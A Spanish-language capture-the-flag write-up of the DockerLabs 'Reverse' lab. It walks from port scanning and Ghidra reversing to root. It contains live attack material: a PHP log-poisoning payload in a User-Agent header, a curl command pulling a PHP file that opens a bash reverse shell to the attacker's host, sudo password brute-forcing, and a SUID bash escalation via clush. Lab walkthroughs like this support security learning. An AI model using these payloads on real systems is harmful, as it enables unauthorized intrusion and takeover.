#MAQUINA #DOCKERLABS #MEDIO
#GHIDRA #REVERSE_ENGINEERING
#LFI #LOG_POISONING 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Reverse** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 16:05 CET
Initiating ARP Ping Scan at 16:05
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 16:05, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:05
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 16:05, 0.48s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-02-17 16:05:52 CET for 0s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)




```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene los puertos **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2                        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 16:06 CET
Nmap scan report for hackzones.hl (172.17.0.2)
Host is up (0.000020s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: P\xC3\xA1gina Interactiva
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.50 seconds

```

```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 16:06 CET
Nmap scan report for hackzones.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

Usando **gobuster**  vemos que no hay nada interesante.
Sin embargo, si revisamos el **script.js** que se utiliza para la animación tenemos lo siguiente:

```bash
document.body.addEventListener("click",(function(){clickCount++;if(clickCount>=20){alert("secret_dir");clickCount=0}}));
```

Al revisar el directorio, vemos un archivo **secret**, un ejecutable.

## GHIDRA

Vamos a usarlo para realizar ingeniería inversa.

Una vez tengamos descargada la herramienta  :
1. Abre **Ghidra** y selecciona un **proyecto existente** o crea uno nuevo.
2. Ve a **File > Import File...** y elige el archivo binario que deseas analizar.
3. Haz clic en **OK** para finalizar la importación.
4. Una vez importado, haz **clic derecho** sobre el archivo en la ventana **Project Window** y selecciona:
	🔹 **CodeBrowser** → Para desensamblar, analizar y decompilar el código.  

Al dejarlo procesar el ejecutable, nos lleva a main y vemos una función **containsRequiredChars**, si hacemos doble click nos lleva a ella.
En ella vemos que hace una comparación con regex, si hacemos doble click con las constantes, nos muestra su contenido.
Contra -> @MiS3cRetd00m
Si metemos la contra, el ejecutable nos devuelve un texto en base64:
```bash
./secret
Introduzca la contraseña: @MiS3cRetd00m
Recibido...
Comprobando...
Contraseña correcta, mensaje secreto:
ZzAwZGowYi5yZXZlcnNlLmRsCg==
```

Nos devuelve un host virtual que meteremos en el /etc/hosts:

```bash
g00dj0b.reverse.dl
```

Al entrar y hacer control +U, vemos :

```bash
                <li><a href="[experiments.php?module=./modules/default.php](view-source:http://g00dj0b.reverse.dl/experiments.php?module=./modules/default.php)">Experimentos Interactivos</a></li>
```

Lo que me hace pensar que es vulnerable a un **LFI**.

Al poner /etc/hosts podemos verlo.

# EXPLOTACION

No nos sirven los wrappers.

Vamos a ver si podemos ver el **access.log** -> `/var/apache2/logs/access.log`

Podemos verlo, aunque me sale vacío.

Vamos a mandar una petición cambiando los headers  :

```bash
curl -s -X GET "http://g00dj0b.reverse.dl/prox" -H "User-Agent: <?php system(\$_GET['cmd']);?>"
```

Apuntamos de nuevo al log:

```bash
view-source:http://g00dj0b.reverse.dl/experiments.php?module=/var/log/apache2/access.log&cmd=id
```

Vemos que podemos ver el resultado del comando.

Lo que podemos es ponernos en escucha por un puerto y mandarnos una reverse shell, pero por alguna razón no funciona.

Vamos a mandar un script php al directorio /var/www/subdominio. Y al entrar a verlo nos otorgara una reverse shell:

```

http://172.17.0.2/problems.php?backdoor=/var/log/apache2/access.log&cmd=curl 172.17.0.1:8000/wp.php -o /var/www/subdominio/wp.php

```

```php

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


        exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

```

YA ESTAMOS COMO WWW-DATA.

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
┌──[www-data@79f4564391f7]─[/var/www/subdominio]
└──╼ $ sudo -l
Matching Defaults entries for www-data on 79f4564391f7:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on 79f4564391f7:
    (nova : nova) NOPASSWD: /opt/password_nova

```

Vemos **password_nova** con permisos SUDO  :

   ```bash
sudo -u nova /opt/password_nova 
Escribe la contraseña (Pista: se encuentra en el rockyou ;) ):
```

Nos descargamos : https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.py y modificamos la linea del if :

```bash
    if timeout 0.1 bash -c "echo '$password' | sudo -u $usuario /opt/password_nova" > /dev/null 2>&1; then
```


```bash

./Linux-Su-Force.sh nova rockyou.txt 
Contraseña encontrada para el usuario nova: cuteangel
└──╼ $ sudo -u nova /opt/password_nova 
Escribe la contraseña (Pista: se encuentra en el rockyou ;) ): cuteangel
Contraseña correcta, mi contraseña es: BlueSky_42!NeonPineapple

```

**Usuario -> nova**
**Contra -> BlueSky_42!NeonPineapple**

YA ESTAMOS COMO NOVA

Vemos si el usuario tiene permisos SUDO:
   ```bash
┌─[nova@79f4564391f7]─[/var/www/subdominio]
└──╼ $sudo -l
Matching Defaults entries for nova on 79f4564391f7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User nova may run the following commands on 79f4564391f7:
    (maci : maci) NOPASSWD: /lib64/ld-linux-x86-64.so.2

```

Vemos **/lib64/ld-linux-x86-64.so.2** con permisos SUDO  :

```bash

┌─[✗]─[nova@79f4564391f7]─[/var/www/subdominio]
└──╼ $sudo -u maci /lib64/ld-linux-x86-64.so.2 /bin/bash

```

YA ESTAMOS COMO MACI.

Vemos si el usuario tiene permisos SUDO:
   ```bash
┌─[maci@79f4564391f7]─[/etc/clustershell/groups.d]
└──╼ $sudo -l
Matching Defaults entries for maci on 79f4564391f7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User maci may run the following commands on 79f4564391f7:
    (ALL : ALL) NOPASSWD: /usr/bin/clush

```

Vemos **clush** con permisos SUDO  :
Primero accedemos al nodo/s :

```bash

sudo clush -w node[11]

```

- **`-w`**: Especifica los nodos donde ejecutar el comando(en este caso da igual iremos al mismo al estar en un docker).

Luego ejecutamos comando :

```bash

!chmod +s /bin/bash

```

Salimos y ejecutamos:

```bash
┌─[maci@79f4564391f7]─[/etc/clustershell/groups.d]
└──╼ $/bin/bash -p
bash-5.2# whoami 
root
bash-5.2# 
```

**YA ESTAMOS COMO ROOT.**